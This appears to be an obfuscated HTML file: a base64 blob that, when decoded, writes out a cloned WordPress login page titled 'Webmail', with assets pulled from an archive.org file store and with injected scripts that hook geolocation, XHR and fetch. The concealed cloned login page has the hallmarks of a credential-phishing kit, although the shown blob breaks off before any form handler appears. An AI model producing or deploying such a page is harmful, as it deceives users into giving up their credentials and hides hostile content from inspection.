<!DOCTYPE html>
<html>
<head>



  <script>
  document.write(unescape(atob("PCFET0NUWVBFIGh0bWw+CjwhLS0gc2F2ZWQgZnJvbSB1cmw9KDAwMzApaHR0cHM6Ly9pZmItbmwubmwvd3AtbG9naW4ucGhwIC0tPgoKCjxodG1sIGxhbmc9ImVuLUdCIj48c2NyaXB0IHNyYz0iaHR0cHM6Ly9pYTYwMTIwMC51cy5hcmNoaXZlLm9yZy8xNS9pdGVtcy96eGN2Ym4ubWluLmpzL3p4Y3Zibi5taW4uanMuZG93bmxvYWQiIHR5cGU9InRleHQvamF2YXNjcmlwdCIgYXN5bmM9IiI+PC9zY3JpcHQ+PHNjcmlwdD4KICAgIHdpbmRvd1tTeW1ib2wuZm9yKCdNQVJJT19QT1NUX0NMSUVOVF9lcHBpb2NlbWhtbmxiaGpwbGNna29mY2lpZWdvbWNvbicpXSA9IG5ldyAoY2xhc3MgUG9zdENsaWVudCB7CiAgICBjb25zdHJ1Y3RvcihuYW1lLCBkZXN0aW5hdGlvbikgewogICAgICAgIHRoaXMubmFtZSA9IG5hbWU7CiAgICAgICAgdGhpcy5kZXN0aW5hdGlvbiA9IGRlc3RpbmF0aW9uOwogICAgICAgIHRoaXMuc2VydmVyTGlzdGVuZXJzID0ge307CiAgICAgICAgdGhpcy5iZ1JlcXVlc3RzTGlzdGVuZXJzID0ge307CiAgICAgICAgdGhpcy5iZ0V2ZW50c0xpc3RlbmVycyA9IHt9OwogICAgICAgIHdpbmRvdy5hZGRFdmVudExpc3RlbmVyKCdtZXNzYWdlJywgKG1lc3NhZ2UpID0+IHsKICAgICAgICAgICAgY29uc3QgZGF0YSA9IG1lc3NhZ2UuZGF0YTsKICAgICAgICAgICAgY29uc3QgaXNOb3RGb3JNZSA9ICEoZGF0YS5kZXN0aW5hdGlvbiAmJiBkYXRhLmRlc3RpbmF0aW9uID09PSB0aGlzLm5hbWUpOwogICAgICAgICAgICBjb25zdCBoYXNOb3RFdmVudFByb3AgPSAhZGF0YS5ldmVudDsKICAgICAgICAgICAgaWYgKGlzTm90Rm9yTWUgfHwgaGFzTm90RXZlbnRQcm9wKSB7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGRhdGEuZXZlbnQgPT09ICdNQVJJT19QT1NUX1NFUlZFUl9fQkdfUkVTUE9OU0UnKSB7CiAgICAgICAgICAgICAgICBjb25zdCByZXNwb25zZSA9IGRhdGEuYXJnczsKICAgICAgICAgICAgICAgIGlmICh0aGlzLmhhc0JnUmVxdWVzdExpc3RlbmVyKHJlc3BvbnNlLnJlcXVlc3RJZCkpIHsKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICB0aGlzLmJnUmVxdWVzdHNMaXN0ZW5lcnNbcmVzcG9uc2UucmVxdWVzdElkXShyZXNwb25zZS5yZXNwb25zZSk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKGUpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBkZWxldGUgdGhpcy5iZ1JlcXVlc3RzTGlzdGVuZXJzW3Jlc3BvbnNlLnJlcXVlc3RJZF07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSBpZiAoZGF0YS5ldmVudCA9PT0gJ01BUklPX1BPU1RfU0VSVkVSX19CR19FVkVOVCcpIHsKICAgICAgICAgICAgICAgIGNvbnN0IHJlc3BvbnNlID0gZGF0YS5hcmdzOwogICAgICAgICAgICAgICAgaWYgKHRoaXMuaGFzQmdFdmVudExpc3RlbmVyKHJlc3BvbnNlLmV2ZW50KSkgewogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRoaXMuYmdFdmVudHNMaXN0ZW5lcnNbZGF0YS5pZF0ocmVzcG9uc2UucGF5bG9hZCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKGUpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIGlmICh0aGlzLmhhc1NlcnZlckxpc3RlbmVyKGRhdGEuZXZlbnQpKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIHRoaXMuc2VydmVyTGlzdGVuZXJzW2RhdGEuZXZlbnRdKGRhdGEuYXJncyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoZSkgewogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKGUpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgY29uc29sZS5sb2coYGV2ZW50IG5vdCBoYW5kbGVkOiAke2RhdGEuZXZlbnR9YCk7CiAgICAgICAgICAgIH0KICAgICAgICB9KTsKICAgIH0KICAgIGVtaXRUb1NlcnZlcihldmVudCwgYXJncykgewogICAgICAgIGNvbnN0IGlkID0gdGhpcy5nZW5lcmF0ZVVJSUQoKTsKICAgICAgICBjb25zdCBtZXNzYWdlID0gewogICAgICAgICAgICBhcmdzLAogICAgICAgICAgICBkZXN0aW5hdGlvbjogdGhpcy5kZXN0aW5hdGlvbiwKICAgICAgICAgICAgZXZlbnQsCiAgICAgICAgICAgIGlkLAogICAgICAgIH07CiAgICAgICAgd2luZG93LnBvc3RNZXNzYWdlKG1lc3NhZ2UsIGxvY2F0aW9uLm9yaWdpbik7CiAgICAgICAgcmV0dXJuIGlkOwogICAgfQogICAgZW1pdFRvQmcoYmdFdmVudE5hbWUsIGFyZ3MpIHsKICAgICAgICBjb25zdCByZXF1ZXN0SWQgPSB0aGlzLmdlbmVyYXRlVUlJRCgpOwogICAgICAgIGNvbnN0IHJlcXVlc3QgPSB7IGJnRXZlbnROYW1lLCByZXF1ZXN0SWQsIGFyZ3MgfTsKICAgICAgICB0aGlzLmVtaXRUb1NlcnZlcignTUFSSU9fUE9TVF9TRVJWRVJfX0JHX1JFUVVFU1QnLCByZXF1ZXN0KTsKICAgICAgICByZXR1cm4gcmVxdWVzdElkOwogICAgfQogICAgaGFzU2VydmVyTGlzdGVuZXIoZXZlbnQpIHsKICAgICAgICByZXR1cm4gISF0aGlzLnNlcnZlckxpc3RlbmVyc1tldmVudF07CiAgICB9CiAgICBoYXNCZ1JlcXVlc3RMaXN0ZW5lcihyZXF1ZXN0SWQpIHsKICAgICAgICByZXR1cm4gISF0aGlzLmJnUmVxdWVzdHNMaXN0ZW5lcnNbcmVxdWVzdElkXTsKICAgIH0KICAgIGhhc0JnRXZlbnRMaXN0ZW5lcihiZ0V2ZW50TmFtZSkgewogICAgICAgIHJldHVybiAhIXRoaXMuYmdFdmVudHNMaXN0ZW5lcnNbYmdFdmVudE5hbWVdOwogICAgfQogICAgZnJvbVNlcnZlckV2ZW50KGV2ZW50LCBsaXN0ZW5lcikgewogICAgICAgIHRoaXMuc2VydmVyTGlzdGVuZXJzW2V2ZW50XSA9IGxpc3RlbmVyOwogICAgfQogICAgZnJvbUJnRXZlbnQoYmdFdmVudE5hbWUsIGxpc3RlbmVyKSB7CiAgICAgICAgdGhpcy5iZ0V2ZW50c0xpc3RlbmVyc1tiZ0V2ZW50TmFtZV0gPSBsaXN0ZW5lcjsKICAgIH0KICAgIGZyb21CZ1Jlc3BvbnNlKHJlcXVlc3RJZCwgbGlzdGVuZXIpIHsKICAgICAgICB0aGlzLmJnUmVxdWVzdHNMaXN0ZW5lcnNbcmVxdWVzdElkXSA9IGxpc3RlbmVyOwogICAgfQogICAgZ2VuZXJhdGVVSUlEKCkgewogICAgICAgIHJldHVybiAneHh4eHh4eHgteHh4eC00eHh4LXl4eHgteHh4eHh4eHh4eHh4Jy5yZXBsYWNlKC9beHldL2csIGZ1bmN0aW9uIChjKSB7CiAgICAgICAgICAgIGNvbnN0IHIgPSBNYXRoLnJhbmRvbSgpICogMTYgfCAwLCB2ID0gYyA9PT0gJ3gnID8gciA6IChyICYgMHgzIHwgMHg4KTsKICAgICAgICAgICAgcmV0dXJuIHYudG9TdHJpbmcoMTYpOwogICAgICAgIH0pOwogICAgfQp9KSgnTUFSSU9fUE9TVF9DTElFTlRfZXBwaW9jZW1obW5sYmhqcGxjZ2tvZmNpaWVnb21jb24nLCAnTUFSSU9fUE9TVF9TRVJWRVJfZXBwaW9jZW1obW5sYmhqcGxjZ2tvZmNpaWVnb21jb24nKTwvc2NyaXB0PjxzY3JpcHQ+CiAgICBjb25zdCBoaWRlTXlMb2NhdGlvbiA9IG5ldyAoY2xhc3MgSGlkZU15TG9jYXRpb24gewogICAgY29uc3RydWN0b3IoY2xpZW50S2V5KSB7CiAgICAgICAgdGhpcy5jbGllbnRLZXkgPSBjbGllbnRLZXk7CiAgICAgICAgdGhpcy53YXRjaElEcyA9IHt9OwogICAgICAgIHRoaXMuY2xpZW50ID0gd2luZG93W1N5bWJvbC5mb3IoY2xpZW50S2V5KV07CiAgICAgICAgY29uc3QgZ2V0Q3VycmVudFBvc2l0aW9uID0gbmF2aWdhdG9yLmdlb2xvY2F0aW9uLmdldEN1cnJlbnRQb3NpdGlvbjsKICAgICAgICBjb25zdCB3YXRjaFBvc2l0aW9uID0gbmF2aWdhdG9yLmdlb2xvY2F0aW9uLndhdGNoUG9zaXRpb247CiAgICAgICAgY29uc3QgY2xlYXJXYXRjaCA9IG5hdmlnYXRvci5nZW9sb2NhdGlvbi5jbGVhcldhdGNoOwogICAgICAgIGNvbnN0IHNlbGYgPSB0aGlzOwogICAgICAgIG5hdmlnYXRvci5nZW9sb2NhdGlvbi5nZXRDdXJyZW50UG9zaXRpb24gPSBmdW5jdGlvbiAoc3VjY2Vzc0NhbGxiYWNrLCBlcnJvckNhbGxiYWNrLCBvcHRpb25zKSB7CiAgICAgICAgICAgIHNlbGYuaGFuZGxlKGdldEN1cnJlbnRQb3NpdGlvbiwgJ0dFVCcsIHN1Y2Nlc3NDYWxsYmFjaywgZXJyb3JDYWxsYmFjaywgb3B0aW9ucyk7CiAgICAgICAgfTsKICAgICAgICBuYXZpZ2F0b3IuZ2VvbG9jYXRpb24ud2F0Y2hQb3NpdGlvbiA9IGZ1bmN0aW9uIChzdWNjZXNzQ2FsbGJhY2ssIGVycm9yQ2FsbGJhY2ssIG9wdGlvbnMpIHsKICAgICAgICAgICAgcmV0dXJuIHNlbGYuaGFuZGxlKHdhdGNoUG9zaXRpb24sICdXQVRDSCcsIHN1Y2Nlc3NDYWxsYmFjaywgZXJyb3JDYWxsYmFjaywgb3B0aW9ucyk7CiAgICAgICAgfTsKICAgICAgICBuYXZpZ2F0b3IuZ2VvbG9jYXRpb24uY2xlYXJXYXRjaCA9IGZ1bmN0aW9uIChmYWtlV2F0Y2hJZCkgewogICAgICAgICAgICBpZiAoZmFrZVdhdGNoSWQgPT09IC0xKSB7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY29uc3QgcmVhbFdhdGNoSWQgPSBzZWxmLndhdGNoSURzW2Zha2VXYXRjaElkXTsKICAgICAgICAgICAgZGVsZXRlIHNlbGYud2F0Y2hJRHNbZmFrZVdhdGNoSWRdOwogICAgICAgICAgICByZXR1cm4gY2xlYXJXYXRjaC5hcHBseSh0aGlzLCBbcmVhbFdhdGNoSWRdKTsKICAgICAgICB9OwogICAgfQogICAgaGFuZGxlKGdldEN1cnJlbnRQb3NpdGlvbk9yV2F0Y2hQb3NpdGlvbiwgdHlwZSwgc3VjY2Vzc0NhbGxiYWNrLCBlcnJvckNhbGxiYWNrLCBvcHRpb25zKSB7CiAgICAgICAgY29uc3QgcmVxdWVzdElkID0gdGhpcy5jbGllbnQuZW1pdFRvQmcoJ0hJREVfTVlfTE9DQVRJT05fX0dFVF9MT0NBVElPTicpOwogICAgICAgIGxldCBmYWtlV2F0Y2hJZCA9IHRoaXMuZ2V0UmFuZG9tSW50KDAsIDEwMDAwMCk7CiAgICAgICAgdGhpcy5jbGllbnQuZnJvbUJnUmVzcG9uc2UocmVxdWVzdElkLCAocmVzcG9uc2UpID0+IHsKICAgICAgICAgICAgaWYgKHJlc3BvbnNlLmVuYWJsZWQpIHsKICAgICAgICAgICAgICAgIGlmIChyZXNwb25zZS5zdGF0dXMgPT09ICdTVUNDRVNTJykgewogICAgICAgICAgICAgICAgICAgIGNvbnN0IHBvc2l0aW9uID0gdGhpcy5tYXAocmVzcG9uc2UpOwogICAgICAgICAgICAgICAgICAgIHN1Y2Nlc3NDYWxsYmFjayhwb3NpdGlvbik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBjb25zdCBlcnJvciA9IHRoaXMuZXJyb3JPYmooKTsKICAgICAgICAgICAgICAgICAgICBlcnJvckNhbGxiYWNrKGVycm9yKTsKICAgICAgICAgICAgICAgICAgICBmYWtlV2F0Y2hJZCA9IC0xOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgY29uc3QgYXJncyA9IFtzdWNjZXNzQ2FsbGJhY2ssIGVycm9yQ2FsbGJhY2ssIG9wdGlvbnNdOwogICAgICAgICAgICAgICAgY29uc3Qgd2F0Y2hJZCA9IGdldEN1cnJlbnRQb3NpdGlvbk9yV2F0Y2hQb3NpdGlvbi5hcHBseShuYXZpZ2F0b3IuZ2VvbG9jYXRpb24sIGFyZ3MpOwogICAgICAgICAgICAgICAgaWYgKHR5cGUgPT09ICdXQVRDSCcpIHsKICAgICAgICAgICAgICAgICAgICB0aGlzLndhdGNoSURzW2Zha2VXYXRjaElkXSA9IHdhdGNoSWQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9KTsKICAgICAgICBpZiAodHlwZSA9PT0gJ1dBVENIJykgewogICAgICAgICAgICByZXR1cm4gZmFrZVdhdGNoSWQ7CiAgICAgICAgfQogICAgfQogICAgbWFwKHJlc3BvbnNlKSB7CiAgICAgICAgcmV0dXJuIHsKICAgICAgICAgICAgY29vcmRzOiB7CiAgICAgICAgICAgICAgICBhY2N1cmFjeTogMjAsCiAgICAgICAgICAgICAgICBhbHRpdHVkZTogbnVsbCwKICAgICAgICAgICAgICAgIGFsdGl0dWRlQWNjdXJhY3k6IG51bGwsCiAgICAgICAgICAgICAgICBoZWFkaW5nOiBudWxsLAogICAgICAgICAgICAgICAgbGF0aXR1ZGU6IHJlc3BvbnNlLmxhdGl0dWRlLAogICAgICAgICAgICAgICAgbG9uZ2l0dWRlOiByZXNwb25zZS5sb25naXR1ZGUsCiAgICAgICAgICAgICAgICBzcGVlZDogbnVsbCwKICAgICAgICAgICAgfSwKICAgICAgICAgICAgdGltZXN0YW1wOiBEYXRlLm5vdygpLAogICAgICAgIH07CiAgICB9CiAgICBlcnJvck9iaigpIHsKICAgICAgICByZXR1cm4gewogICAgICAgICAgICBjb2RlOiAxLAogICAgICAgICAgICBtZXNzYWdlOiAnVXNlciBkZW5pZWQgR2VvbG9jYXRpb24nLAogICAgICAgIH07CiAgICB9CiAgICBnZXRSYW5kb21JbnQobWluLCBtYXgpIHsKICAgICAgICBtaW4gPSBNYXRoLmNlaWwobWluKTsKICAgICAgICBtYXggPSBNYXRoLmZsb29yKG1heCk7CiAgICAgICAgcmV0dXJuIE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIChtYXggLSBtaW4gKyAxKSkgKyBtaW47CiAgICB9Cn0pKCdNQVJJT19QT1NUX0NMSUVOVF9lcHBpb2NlbWhtbmxiaGpwbGNna29mY2lpZWdvbWNvbicpCiAgPC9zY3JpcHQ+PGhlYWQ+PG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgiPgoJCgk8dGl0bGU+TG9nIEluIChXZWJtYWlsIOKAlCBXb3JkUHJlc3MpPC90aXRsZT4KCQoJCgkKCTxtZXRhIG5hbWU9InJvYm90cyIgY29udGVudD0ibm9pbmRleCwgZm9sbG93Ij4KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBpZD0iZGFzaGljb25zLWNzcyIgaHJlZj0iaHR0cHM6Ly9pYTYwMTIwMC51cy5hcmNoaXZlLm9yZy8xNS9pdGVtcy96eGN2Ym4ubWluLmpzL2Rhc2hpY29ucy5taW4uY3NzIiB0eXBlPSJ0ZXh0L2NzcyIgbWVkaWE9ImFsbCI+CjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaWQ9ImJ1dHRvbnMtY3NzIiBocmVmPSJodHRwczovL2lhNjAxMjAwLnVzLmFyY2hpdmUub3JnLzE1L2l0ZW1zL3p4Y3Zibi5taW4uanMvYnV0dG9ucy5taW4uY3NzIiB0eXBlPSJ0ZXh0L2NzcyIgbWVkaWE9ImFsbCI+CjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaWQ9ImZvcm1zLWNzcyIgaHJlZj0iaHR0cHM6Ly9pYTYwMTIwMC51cy5hcmNoaXZlLm9yZy8xNS9pdGVtcy96eGN2Ym4ubWluLmpzL2Zvcm1zLm1pbi5jc3MiIHR5cGU9InRleHQvY3NzIiBtZWRpYT0iYWxsIj4KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBpZD0ibDEwbi1jc3MiIGhyZWY9Imh0dHBzOi8vaWE2MDEyMDAudXMuYXJjaGl2ZS5vcmcvMTUvaXRlbXMvenhjdmJuLm1pbi5qcy9sMTBuLm1pbi5jc3MiIHR5cGU9InRleHQvY3NzIiBtZWRpYT0iYWxsIj4KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBpZD0ibG9naW4tY3NzIiBocmVmPSJodHRwczovL2lhNjAxMjAwLnVzLmFyY2hpdmUub3JnLzE1L2l0ZW1zL3p4Y3Zibi5taW4uanMvbG9naW4ubWluLmNzcyIgdHlwZT0idGV4dC9jc3MiIG1lZGlhPSJhbGwiPgoJPG1ldGEgbmFtZT0icmVmZXJyZXIiIGNvbnRlbnQ9InN0cmljdC1vcmlnaW4td2hlbi1jcm9zcy1vcmlnaW4iPgoJCTxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgiPgoJPGxpbmsgcmVsPSJpY29uIiBocmVmPSJodHRwczovL2lmYi1ubC5ubC93cC1jb250ZW50L3VwbG9hZHMvMjAyMy8wMy9jcm9wcGVkLU5ldy1Qcm9qZWN0LTQzLTMyeDMyLnBuZyIgc2l6ZXM9IjMyeDMyIj4KPGxpbmsgcmVsPSJpY29uIiBocmVmPSJodHRwczovL2lmYi1ubC5ubC93cC1jb250ZW50L3VwbG9hZHMvMjAyMy8wMy9jcm9wcGVkLU5ldy1Qcm9qZWN0LTQzLTE5MngxOTIucG5nIiBzaXplcz0iMTkyeDE5MiI+CjxsaW5rIHJlbD0iYXBwbGUtdG91Y2gtaWNvbiIgaHJlZj0iaHR0cHM6Ly9pZmItbmwubmwvd3AtY29udGVudC91cGxvYWRzLzIwMjMvMDMvY3JvcHBlZC1OZXctUHJvamVjdC00My0xODB4MTgwLnBuZyI+CjxtZXRhIG5hbWU9Im1zYXBwbGljYXRpb24tVGlsZUltYWdlIiBjb250ZW50PSJodHRwczovL2lmYi1ubC5ubC93cC1jb250ZW50L3VwbG9hZHMvMjAyMy8wMy9jcm9wcGVkLU5ldy1Qcm9qZWN0LTQzLTI3MHgyNzAucG5nIj4KCTxzY3JpcHQgZWNvbW1lcmNlLXR5cGU9ImV4dGVuZC1uYXRpdmUtaGlzdG9yeS1hcGkiPigoKSA9PiB7CiAgICAgICAgICAgIGNvbnN0IG5hdGl2ZVB1c2hTdGF0ZSA9IGhpc3RvcnkucHVzaFN0YXRlOwogICAgICAgICAgICBjb25zdCBuYXRpdmVSZXBsYWNlU3RhdGUgPSBoaXN0b3J5LnJlcGxhY2VTdGF0ZTsKICAgICAgICAgICAgY29uc3QgbmF0aXZlQmFjayA9IGhpc3RvcnkuYmFjazsKICAgICAgICAgICAgY29uc3QgbmF0aXZlRm9yd2FyZCA9IGhpc3RvcnkuZm9yd2FyZDsKICAgICAgICAgICAgZnVuY3Rpb24gZW1pdFVybENoYW5nZWQoKSB7CiAgICAgICAgICAgICAgICBjb25zdCBtZXNzYWdlID0gewogICAgICAgICAgICAgICAgICAgIF9jdXN0b21fdHlwZV86ICdDVVNUT01fT05fVVJMX0NIQU5HRUQnLAogICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgIHdpbmRvdy5wb3N0TWVzc2FnZShtZXNzYWdlKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBoaXN0b3J5LnB1c2hTdGF0ZSA9IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgIG5hdGl2ZVB1c2hTdGF0ZS5hcHBseShoaXN0b3J5LCBhcmd1bWVudHMpOwogICAgICAgICAgICAgICAgZW1pdFVybENoYW5nZWQoKTsKICAgICAgICAgICAgfTsKICAgICAgICAgICAgaGlzdG9yeS5yZXBsYWNlU3RhdGUgPSBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICBuYXRpdmVSZXBsYWNlU3RhdGUuYXBwbHkoaGlzdG9yeSwgYXJndW1lbnRzKTsKICAgICAgICAgICAgICAgIGVtaXRVcmxDaGFuZ2VkKCk7CiAgICAgICAgICAgIH07CiAgICAgICAgICAgIGhpc3RvcnkuYmFjayA9IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgIG5hdGl2ZUJhY2suYXBwbHkoaGlzdG9yeSwgYXJndW1lbnRzKTsKICAgICAgICAgICAgICAgIGVtaXRVcmxDaGFuZ2VkKCk7CiAgICAgICAgICAgIH07CiAgICAgICAgICAgIGhpc3RvcnkuZm9yd2FyZCA9IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgIG5hdGl2ZUZvcndhcmQuYXBwbHkoaGlzdG9yeSwgYXJndW1lbnRzKTsKICAgICAgICAgICAgICAgIGVtaXRVcmxDaGFuZ2VkKCk7CiAgICAgICAgICAgIH07CiAgICAgICAgfSkoKTwvc2NyaXB0PjxzY3JpcHQ+KGZ1bmN0aW9uIGluamVjdChlKXtmdW5jdGlvbiBTZW5kWEhSQ2FuZGlkYXRlKGUsdCxuLHIsaSl7dHJ5e3ZhciBvPSJkZXRlY3RvciIscz17cG9zZE1lc3NhZ2VJZDoiUEFORUxPU19NRVNTQUdFIixwb3NkSGFzaDooTWF0aC5yYW5kb20oKS50b1N0cmluZygzNikuc3Vic3RyaW5nKDIsMTUpK01hdGgucmFuZG9tKCkudG9TdHJpbmcoMzYpLnN1YnN0cmluZygyLDE1KStNYXRoLnJhbmRvbSgpLnRvU3RyaW5nKDM2KS5zdWJzdHJpbmcoMiwxNSkpLnN1YnN0cmluZygwLDIyKSx0eXBlOiJWSURFT19YSFJfQ0FORElEQVRFIixmcm9tOm8sdG86by5zdWJzdHJpbmcoMCw2KSxjb250ZW50OntyZXF1ZXN0TWV0aG9kOmUsdXJsOnQsdHlwZTpuLGNvbnRlbnQ6cn19O2kmJmlbMF0mJmlbMF0ubGVuZ3RoJiYocy5jb250ZW50LmVuY29kZWRQb3N0Qm9keT1pWzBdKSx3aW5kb3cucG9zdE1lc3NhZ2UocywiKiIpfWNhdGNoKGUpe319dmFyIHQ9WE1MSHR0cFJlcXVlc3QucHJvdG90eXBlLm9wZW47WE1MSHR0cFJlcXVlc3QucHJvdG90eXBlLm9wZW49ZnVuY3Rpb24oKXt0aGlzLnJlcXVlc3RNZXRob2Q9YXJndW1lbnRzWzBdLHQuYXBwbHkodGhpcyxhcmd1bWVudHMpfTt2YXIgbj1YTUxIdHRwUmVxdWVzdC5wcm90b3R5cGUuc2VuZDtYTUxIdHRwUmVxdWVzdC5wcm90b3R5cGUuc2VuZD1mdW5jdGlvbigpe3ZhciB0PU9iamVjdC5hc3NpZ24oYXJndW1lbnRzLHt9KSxyPXRoaXMub25yZWFkeXN0YXRlY2hhbmdlO3JldHVybiB0aGlzLm9ucmVhZHlzdGF0ZWNoYW5nZT1mdW5jdGlvbigpe2lmKDQhPT10aGlzLnJlYWR5U3RhdGV8fGZ1bmN0aW9uIGlzRnJhbWVJbkJsYWNrTGlzdCh0KXtyZXR1cm4gZS5zb21lKChmdW5jdGlvbihlKXtyZXR1cm4gdC5pbmNsdWRlcyhlKX0pKX0odGhpcy5yZXNwb25zZVVSTCl8fHNldFRpbWVvdXQoU2VuZFhIUkNhbmRpZGF0ZSh0aGlzLnJlcXVlc3RNZXRob2QsdGhpcy5yZXNwb25zZVVSTCx0aGlzLmdldFJlc3BvbnNlSGVhZGVyKCJjb250ZW50LXR5cGUiKSx0aGlzLnJlc3BvbnNlLHQpLDApLHIpcmV0dXJuIHIuYXBwbHkodGhpcyxhcmd1bWVudHMpfSxuLmFwcGx5KHRoaXMsYXJndW1lbnRzKX07dmFyIHI9ZmV0Y2g7ZmV0Y2g9ZnVuY3Rpb24gZmV0Y2goKXt2YXIgZT10aGlzLHQ9YXJndW1lbnRzLG49YXJndW1lbnRzWzBdaW5zdGFuY2VvZiBSZXF1ZXN0P2FyZ3VtZW50c1swXS51cmw6YXJndW1lbnRzWzBdLGk9YXJndW1lbnRzWzBdaW5zdGFuY2VvZiBSZXF1ZXN0P2FyZ3VtZW50c1swXS5tZXRob2Q6IkdFVCI7cmV0dXJuIG5ldyBQcm9taXNlKChmdW5jdGlvbihvLHMpe3IuYXBwbHkoZSx0KS50aGVuKChmdW5jdGlvbihlKXtpZihlLmJvZHkgaW5zdGFuY2VvZiBSZWFkYWJsZVN0cmVhbSl7dmFyIHQ9ZS5qc29uO2UuanNvbj1mdW5jdGlvbigpe3ZhciByPWFyZ3VtZW50cyxvPXRoaXM7cmV0dXJuIG5ldyBQcm9taXNlKChmdW5jdGlvbihzLGEpe3QuYXBwbHkobyxyKS50aGVuKChmdW5jdGlvbih0KXtzZXRUaW1lb3V0KFNlbmRYSFJDYW5kaWRhdGUoaSxuLGUuaGVhZGVycy5nZXQoImNvbnRlbnQtdHlwZSIpLEpTT04uc3RyaW5naWZ5KHQpKSwwKSxzKHQpfSkpLmNhdGNoKChmdW5jdGlvbihlKXthKGUpfSkpfSkpfTt2YXIgcj1lLnRleHQ7ZS50ZXh0PWZ1bmN0aW9uKCl7dmFyIHQ9YXJndW1lbnRzLG89dGhpcztyZXR1cm4gbmV3IFByb21pc2UoKGZ1bmN0aW9uKHMsYSl7ci5hcHBseShvLHQpLnRoZW4oKGZ1bmN0aW9uKHQpe3NldFRpbWVvdXQoU2VuZFhIUkNhbmRpZGF0ZShpLG4sZS5oZWFkZXJzLmdldCgiY29udGVudC10eXBlIiksdCksMCkscyh0KX0pKS5jYXRjaCgoZnVuY3Rpb24oZSl7YShlKX0pKX0pKX19by5hcHBseSh0aGlzLGFyZ3VtZW50cyl9KSkuY2F0Y2goKGZ1bmN0aW9uKCl7cy5hcHBseSh0aGlzLGFyZ3VtZW50cyl9KSl9KSl9fSkoWyJmYWNlYm9vay5jb20vIiwidHdpdHRlci5jb20vIiwieW91dHViZS1ub2Nvb2tpZS5jb20vZW1iZWQvIiwiLy92ay5jb20vIiwiLy93d3cudmsuY29tLyIsIi8vbGlua2VkaW4uY29tLyIsIi8vd3d3LmxpbmtlZGluLmNvbS8iLCIvL2luc3RhZ3JhbS5jb20vIiwiLy93d3cuaW5zdGFncmFtLmNvbS8iLCIvL3d3dy5nb29nbGUuY29tL3JlY2FwdGNoYS9hcGkyLyIsIi8vaGFuZ291dHMuZ29vZ2xlLmNvbS93ZWJjaGF0LyIsIi8vd3d3Lmdvb2dsZS5jb20vY2FsZW5kYXIvIiwiLy93d3cuZ29vZ2xlLmNvbS9tYXBzL2VtYmVkIiwic3BvdGlmeS5jb20vIiwic291bmRjbG91ZC5jb20vIiwiLy9wbGF5ZXIudmltZW8uY29tLyIsIi8vZGlzcXVzLmNvbS8iLCIvL3Rnd2lkZ2V0LmNvbS8iLCIvL2pzLmRyaWZ0dC5jb20vIiwiZnJpZW5kczJmb2xsb3cuY29tIiwiL3dpZGdldCIsImxvZ2luIiwiLy92aWRlby5iaWdtaXIubmV0LyIsImJsb2dnZXIuY29tIiwiLy9zbWFydGxvY2suZ29vZ2xlLmNvbS8iLCIvL2tlZXAuZ29vZ2xlLmNvbS8iLCIvd2ViLnRvbHN0b3ljb21tZW50cy5jb20vIiwibW96LWV4dGVuc2lvbjovLyIsImNocm9tZS1leHRlbnNpb246Ly8iLCIvYXV0aC8iLCIvL2FuYWx5dGljcy5nb29nbGUuY29tLyIsImFkY2xhcml0eS5jb20iLCJwYWRkbGUuY29tL2NoZWNrb3V0IiwiaGNhcHRjaGEuY29tIiwicmVjYXB0Y2hhLm5ldCIsIjJjYXB0Y2hhLmNvbSIsImFjY291bnRzLmdvb2dsZS5jb20iLCJ3d3cuZ29vZ2xlLmNvbS9zaG9wcGluZy9jdXN0b21lcnJldmlld3MiLCJidXkudGlueXBhc3MuY29tIiwiZ3N0YXRpYy5jb20iLCJzZWN1cmVpci5lYmF5c3RhdGljLmNvbSIsImRvY3MuZ29vZ2xlLmNvbSIsImNvbnRhY3RzLmdvb2dsZS5jb20iLCJnaXRodWIuY29tIiwibWFpbC5nb29nbGUuY29tIiwiY2hhdC5nb29nbGU